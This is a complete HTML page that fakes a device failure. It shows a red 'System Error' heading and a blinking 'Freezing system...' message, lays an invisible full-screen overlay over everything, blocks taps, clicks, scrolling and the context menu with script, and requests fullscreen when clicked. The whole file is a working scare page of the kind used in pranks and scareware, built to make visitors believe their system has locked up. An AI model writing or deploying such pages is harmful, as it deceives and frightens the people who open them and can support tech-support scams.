<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>System Error</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
      background: #000;
      color: #fff;
      font-family: sans-serif;
      user-select: none;
      touch-action: none;
    }

    .center-box {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
    }

    .center-box h1 {
      color: red;
      font-size: 24px;
      margin-bottom: 10px;
    }

    .loading {
      font-size: 18px;
      animation: blink 1.5s infinite;
    }

    @keyframes blink {
      0%, 100% { opacity: 0.2; }
      50% { opacity: 1; }
    }

    .blocker {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      z-index: 9999;
      background: rgba(255, 255, 255, 0.001);
      pointer-events: all;
    }
  </style>
</head>
<body>

  <div class="center-box">
    <h1>System Error</h1>
    <div class="loading">Freezing system<span class="dot">...</span></div>
  </div>

  <div class="blocker"></div>

  <script>
    // Prevent all touch/mouse input
    window.addEventListener('touchstart', e => e.preventDefault(), { passive: false });
    window.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
    window.addEventListener('click', e => e.preventDefault());
    window.addEventListener('contextmenu', e => e.preventDefault());

    // Go fullscreen if possible
    document.body.addEventListener('click', () => {
      const el = document.documentElement;
      if (el.requestFullscreen) el.requestFullscreen();
    });
  </script>

</body>
</html>
